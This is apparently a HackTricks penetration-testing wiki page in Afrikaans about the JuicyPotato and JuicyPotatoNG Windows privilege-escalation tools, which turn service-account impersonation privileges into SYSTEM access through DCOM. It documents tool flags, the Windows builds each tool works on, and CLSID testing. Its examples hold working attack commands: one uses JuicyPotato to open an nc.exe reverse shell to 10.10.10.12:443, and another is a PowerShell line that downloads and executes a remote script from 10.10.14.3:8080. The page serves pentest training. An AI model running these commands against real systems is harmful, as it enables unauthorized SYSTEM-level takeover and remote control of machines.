# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato is verouderd. Dit werk oor die algemeen op Windows-weergawes tot en met Windows 10 1803 / Windows Server 2016. Microsoft-veranderinge wat vanaf Windows 10 1809 / Server 2019 verskeep is, het die oorspronklike tegniek gebreek. Vir daardie builds en nuwer weergawes, oorweeg moderne alternatiewe soos PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato en ander. Sien die onderstaande bladsy vir bygewerkte opsies en gebruik.

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (misbruik van die goue voorregte) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_‘n Versuikerde weergawe van_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, met ‘n bietjie juice, d.w.s. **nog ‘n Local Privilege Escalation-tool, van Windows Service Accounts na NT AUTHORITY\SYSTEM**_<sup>[[1]](#references)</sup>

#### Jy kan juicypotato aflaai vanaf [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Vinnige verenigbaarheidsnotas

- Werk betroubaar tot en met Windows 10 1803 en Windows Server 2016 wanneer die huidige konteks SeImpersonatePrivilege of SeAssignPrimaryTokenPrivilege het.
- Gebreek deur Microsoft se hardening in Windows 10 1809 / Windows Server 2019 en nuwer. Verkies die alternatiewe waarna hierbo geskakel word vir daardie builds.

### Opsomming <a href="#summary" id="summary"></a>

[**Vanaf juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**<sup>[[1]](#references)</sup>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) en sy [variante](https://github.com/decoder-it/lonelypotato) gebruik die privilege escalation-ketting gebaseer op [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) wat die MiTM-listener op `127.0.0.1:6666` het, wanneer jy `SeImpersonate`- of `SeAssignPrimaryToken`-privileges het. Tydens ‘n Windows-build-oorsig het ons ‘n opstelling gevind waar `BITS` doelbewus gedeaktiveer was en poort `6666` beset was.

Ons het besluit om [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) te weaponize: **Sê hallo vir Juicy Potato**.

> Vir die teorie, sien [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) en volg die ketting van skakels en verwysings.<sup>[[4]](#references)</sup>

Benewens `BITS` kan verskeie COM-servers misbruik word. Hulle hoef slegs:

1. deur die huidige gebruiker instansieerbaar te wees, normaalweg ‘n “service user” wat impersonation-privileges het
2. die `IMarshal`-interface te implementeer
3. as ‘n elevated user (SYSTEM, Administrator, …) te loop

Na ‘n bietjie testing het ons ‘n uitgebreide lys van [interessante CLSID’s](http://ohpe.it/juicy-potato/CLSID/) op verskeie Windows-weergawes verkry en getoets.

### Juicy-besonderhede <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato laat jou toe om:<sup>[[1]](#references)</sup>

- **Target CLSID** _enige CLSID te kies wat jy wil hê._ [_Hier_](http://ohpe.it/juicy-potato/CLSID/) _kan jy die lys vind wat volgens OS georganiseer is._
- **COM Listening port** _die COM-listening-poort te definieer wat jy verkies (in plaas van die gemarshalled hardcoded 6666)_
- **COM Listening IP address** _die server aan enige IP te bind_
- **Process creation mode** _afhangend van die impersonated user se privileges kan jy kies uit:_
- `CreateProcessWithToken` (needs `SeImpersonate`)
- `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _‘n executable of script te launch indien die exploitation slaag_
- **Process Argument** _die argumente van die launched process aan te pas_
- **RPC Server address** _vir ‘n stealthy benadering kan jy by ‘n eksterne RPC-server authenticate_
- **RPC Server port** _nuttig indien jy by ‘n eksterne server wil authenticate en die firewall poort `135` blokkeer…_
- **TEST mode** _hoofsaaklik vir testing-doeleindes, d.w.s. om CLSIDs te toets. Dit skep die DCOM en druk die token se gebruiker uit. Sien_ [_hier vir testing_](http://ohpe.it/juicy-potato/Test/)

### Gebruik <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Finale gedagtes <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**<sup>[[1]](#references)</sup>

As die gebruiker `SeImpersonate`- of `SeAssignPrimaryToken`-privileges het, dan is jy **SYSTEM**.

Dit is byna onmoontlik om die misbruik van al hierdie COM Servers te voorkom. Jy kan dit oorweeg om die permissions van hierdie objekte via `DCOMCNFG` te wysig, maar sterkte daarmee; dit gaan uitdagend wees.

Die werklike oplossing is om sensitiewe accounts en applications wat onder die `* SERVICE`-accounts loop, te beskerm. Die stopping van `DCOM` sal hierdie exploit beslis inhibeer, maar kan ’n ernstige impak op die underlying OS hê.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>

## JuicyPotatoNG (2022+)

JuicyPotatoNG bring ’n JuicyPotato-style local privilege escalation op moderne Windows terug deur die volgende te kombineer:<sup>[[2]](#references)</sup>
- DCOM OXID resolution na ’n local RPC server op ’n gekose port, wat die ou hardcoded 127.0.0.1:6666 listener vermy.
- ’n SSPI hook om die inkomende SYSTEM authentication vas te vang en te impersonate sonder om RpcImpersonateClient te vereis, wat ook CreateProcessAsUser moontlik maak wanneer slegs SeAssignPrimaryTokenPrivilege teenwoordig is.
- Tricks om aan DCOM activation constraints te voldoen (byvoorbeeld die voormalige INTERACTIVE-group requirement wanneer PrintNotify / ActiveX Installer Service classes geteiken word).

Belangrike notas (gedrag wat oor builds heen ontwikkel):<sup>[[2]](#references)</sup>
- September 2022: Die aanvanklike technique het op supported Windows 10/11- en Server-targets gewerk deur die “INTERACTIVE trick” te gebruik.
- Januarie 2023-opdatering van die authors: Microsoft het later die INTERACTIVE trick geblokkeer. ’n Ander CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) herstel exploitation, maar volgens hul post slegs op Windows 11 / Server 2022.

Basiese usage (meer flags in die help):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
As jy Windows 10 1809 / Server 2019 teiken waar klassieke JuicyPotato gelap is, verkies die alternatiewe waarna boaan geskakel word (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, ens.). NG kan situasioneel wees, afhangend van die build en dienstoestand.

## Voorbeelde

Nota: Besoek [hierdie bladsy](https://ohpe.it/juicy-potato/CLSID/) vir ’n lys CLSIDs om te probeer.

### Kry ’n nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Begin 'n nuwe CMD (as jy RDP-toegang het)

![Powershell rev - Begin 'n nuwe CMD (as jy RDP-toegang het): Begin 'n nuwe CMD (as jy RDP-toegang het)](<../../images/image (300).png>)

## CLSID-probleme

Dikwels **werk** die verstek-CLSID wat JuicyPotato gebruik **nie**, en die exploit misluk. Gewoonlik verg dit verskeie pogings om 'n **werkende CLSID** te vind. Om 'n lys van CLSID's te kry om vir 'n spesifieke bedryfstelsel te toets, moet jy hierdie bladsy besoek:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Kontroleer CLSID's**

Eerstens sal jy, buiten juicypotato.exe, 'n paar uitvoerbare lêers benodig.

Download [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) en laai dit in jou PS-sessie, en download en voer [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) uit. Daardie script sal 'n lys van moontlike CLSID's skep om te toets.

Download dan [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(verander die pad na die CLSID-lys en na die juicypotato-uitvoerbare lêer) en voer dit uit. Dit sal elke CLSID probeer, en **wanneer die poortnommer verander, beteken dit dat die CLSID gewerk het**.

**Kontroleer** die werkende CLSID's **met die parameter -c**

## References

- [1] [Juicy Potato README (ohpe/juicy-potato)](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [2] [Gee JuicyPotato 'n tweede kans: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [3] [Juicy Potato-projekbladsy (ohpe.it)](http://ohpe.it/juicy-potato/)
- [4] [Rotten Potato - Privilege Escalation vanaf diensrekeninge na SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
{{#include ../../banners/hacktricks-training.md}}
